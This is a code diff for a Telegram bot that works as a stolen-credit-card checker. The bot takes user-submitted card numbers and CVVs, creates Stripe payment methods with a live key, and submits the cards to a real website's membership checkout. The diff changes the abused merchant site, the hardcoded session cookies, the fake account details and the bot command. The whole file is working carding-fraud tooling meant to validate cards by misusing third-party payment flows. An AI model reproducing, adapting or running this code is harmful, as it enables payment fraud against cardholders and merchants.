@@ -8,10 +8,8 @@ from pyrogram import Client, filters
 import json
 
 
-
-
-@Client.on_message(filters.command(["sf"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
-async def sf(Client, message):
+@Client.on_message(filters.command(["ss"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
+async def ss(Client, message):
     try:
         started_time = time.time()
         banned_bins = open('files/bannedbin.txt', 'r').readlines()
@@ -20,7 +18,7 @@ async def sf(Client, message):
             await message.reply_text(text= group_not_allowed,reply_to_message_id=message.message_id)
         else:
             text = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
+<b>〄</b> GATE: <b>STRIPE AUTH [10]</b>
 <b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
 <b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
 <b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
@@ -96,25 +94,25 @@ async def sf(Client, message):
                                 await msg.edit_text("Your Card Is Banned.")
                             else:
                                 bin_data = json.loads(res.text)
-                                # vendor = bin_data["data"]["vendor"].lower()
+                                vendor = bin_data["data"]["vendor"].lower()
                                 curl =  requests.Session()
                                 res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
                                 random_data = json.loads(res.text)
                                 # phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
-                                first_name = random_data['results'][0]['name']['first']
-                                last_name = random_data['results'][0]['name']['last']
-                                street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
-                                city = random_data['results'][0]['location']['city']
-                                state = random_data['results'][0]['location']['state']
-                                zip = random_data['results'][0]['location']['postcode']
+                                # first_name = random_data['results'][0]['name']['first']
+                                # last_name = random_data['results'][0]['name']['last']
+                                # street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
+                                # city = random_data['results'][0]['location']['city']
+                                # state = random_data['results'][0]['location']['state']
+                                # zip = random_data['results'][0]['location']['postcode']
                                 email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
                                 password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
-                                data = f"time_on_page=38212&pasted_fields=number&guid=NA&muid=NA&sid=NA&key=pk_live_omFDE4PpGEioGWha5NXjoPJo&payment_user_agent=stripe.js%2F308cc4f&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_line1]={street}&card[address_line2]=&card[address_city]={city}&card[address_state]={state}&card[address_zip]={zip}&card[address_country]=US&card[cvc]={cvv}&card[name]={first_name}+{last_name}"
-                                res = curl.post("https://api.stripe.com/v1/tokens",headers=sk_headers,data=data)
+                                data = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F7338eae82%3B+stripe-js-v3%2F7338eae82&time_on_page=49042&key=pk_live_51HTZCpASTyhHxjLA7UuxfWqYl4X7EbWi3MtvMxtEP93RBMtqhP80R7EAYdNa2X1VXOKGmrhE42CtE1XnHLdp1dYs003rHkqnia"
+                                res = curl.post("https://api.stripe.com/v1/payment_methods",headers=sk_headers,data=data)
                                 json_first = json.loads(res.text)
                                 if 'error' in json_first:
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
+<b>〄</b> GATE: <b>STRIPE AUTH [10]</b>
 <b>○</b> INPUT: <code>{lista}</code>
 <b>○</b> RESULT: <b>REJECTED❌ [INCORRECT CARD]</b>
 <b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
@@ -126,7 +124,7 @@ async def sf(Client, message):
                                     antidb.set(message.from_user.id, int(time.time()))
                                 elif 'id' not in json_first:
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
+<b>〄</b> GATE: <b>STRIPE AUTH [10]</b>
 <b>○</b> INPUT: <code>{lista}</code>
 <b>○</b> RESULT: <b>REJECTED❌ [ERROR]</b>
 <b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
@@ -139,7 +137,7 @@ async def sf(Client, message):
                                 else:
                                     id = json_first["id"]
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
+<b>〄</b> GATE: <b>STRIPE AUTH [10]</b>
 <b>○</b> INPUT: <code>{lista}</code>
 <b>○</b> PROCESS: <b>■■■■■□□□□□ 50%</b>
 <b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
@@ -147,22 +145,21 @@ async def sf(Client, message):
 <b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
 <b>○</b> BOT BY: <b>@RoldexVerse</b>"""
-
                                     await msg.edit_text(text)
                                     headers = {
-                                    "authority": "www.diamonddjs.co.uk",
-                                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/",
-                                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                                    "content-type": "application/x-www-form-urlencoded",
-                                    "cookie": "PHPSESSID=0587198944f02bad9716a53df84c750a",
-                                    "origin": "https://www.diamonddjs.co.uk",
-                                    "referer": "https://www.diamonddjs.co.uk/membership-account/membership-checkout/",
-                                    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
+                                        "authority": "mintypips.com",
+                                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/",
+                                        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+                                        "content-type": "application/x-www-form-urlencoded",
+                                        "cookie": "asp_transient_id=e7a8475f1dee0e28a6b2225260c6bddc; PHPSESSID=3bb77bd4671e937d6d0b0b793deea6fa",
+                                        "origin": "https://mintypips.com",
+                                        "referer": "https://mintypips.com/membership-account/membership-checkout/",
+                                        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                                     }
-                                    data = f"level=1&checkjavascript=1&other_discount_code=&username={get_username()}&first_name={first_name}&last_name={last_name}&dj_name={first_name}&dj_city={city}&password={password}&password2={password}&bemail={email}&bconfirmemail_copy=1&fullname=&bfirstname={first_name}&blastname={last_name}&baddress1={street}&baddress2=&bcity={city}&bstate={state}&bzipcode={zip}&bcountry=US&bphone=%28225%29+368-7536&CardType=Visa&discount_code=&tos=1&submit-checkout=1&javascriptok=1&stripeToken0={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear={ano}"
-                                    res = curl.post("https://www.diamonddjs.co.uk/membership-account/membership-checkout/",headers=headers,data=data)
+                                    data = f"level=1&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&bemail={email}&bconfirmemail={email}&fullname=&Referred-by=&gateway=stripe&CardType={vendor}&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear={ano}"
+                                    res = curl.post("https://mintypips.com/membership-account/membership-checkout/",headers=headers,data=data) 
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
+<b>〄</b> GATE: <b>STRIPE AUTH [10]</b>
 <b>○</b> INPUT: <code>{lista}</code>
 <b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
 <b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
@@ -245,7 +242,7 @@ async def sf(Client, message):
                                             credits_left = credits - 2
                                             maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}}, upsert=False)
                                             lasttext = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [3]</b>
+<b>〄</b> GATE: <b>STRIPE AUTH [10]</b>
 <b>○</b> INPUT: <code>{lista}</code>
 <b>○</b> RESULT: <b>{response}{r_logo} [{r_text}]</b>
 <b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
